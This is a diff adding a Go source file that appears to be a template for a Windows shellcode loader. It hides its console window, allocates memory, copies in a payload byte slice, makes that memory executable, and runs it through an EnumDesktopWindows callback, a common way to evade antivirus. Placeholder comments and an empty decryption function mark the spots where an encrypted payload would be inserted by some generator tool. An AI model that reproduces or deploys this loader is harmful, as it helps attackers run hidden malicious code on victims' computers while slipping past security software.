@@ -1,0 +1,46 @@
+package main
+
+import (
+	"github.com/gonutz/ide/w32"
+	"golang.org/x/sys/windows"
+//__import__
+	"unsafe"
+)
+
+func closeWindows(commandShow uintptr) {
+	console := w32.GetConsoleWindow()
+	if console != 0 {
+		_, consoleProcID := w32.GetWindowThreadProcessId(console)
+		if w32.GetCurrentProcessId() == consoleProcID {
+			w32.ShowWindowAsync(console, commandShow)
+		}
+	}
+}
+
+// 解密函数
+func f() {}
+
+func main() {
+	// byteSlice
+	closeWindows(w32.SW_HIDE)
+	//__init__
+
+	kernel32          := windows.NewLazyDLL("kernel32.dll")
+	ntdll          := windows.NewLazyDLL("ntdll.dll")
+	User32           := windows.NewLazyDLL("User32.dll")
+	VirtualAlloc      := kernel32.NewProc("VirtualAlloc")
+	VirtualProtect    := kernel32.NewProc("VirtualProtect")
+	GetCurrentThreadId := kernel32.NewProc("GetCurrentThreadId")
+	EnumDesktopWindows := User32.NewProc("EnumDesktopWindows")
+	GetThreadDesktop   := User32.NewProc("GetThreadDesktop")
+	RtlMoveMemory      := ntdll.NewProc("RtlMoveMemory")
+
+	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(byteSlice)), 0x1000, 0x04)
+	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&byteSlice[0])), uintptr(len(byteSlice)))
+	oldProtect := 0x04
+	_, _, _ = VirtualProtect.Call(addr, uintptr(len(byteSlice)), 0x10, uintptr(unsafe.Pointer(&oldProtect)))
+	Thr, _, _ := GetCurrentThreadId.Call()
+	ThrD, _, _ := GetThreadDesktop.Call(Thr)
+
+	EnumDesktopWindows.Call(ThrD, addr, 0)
+}
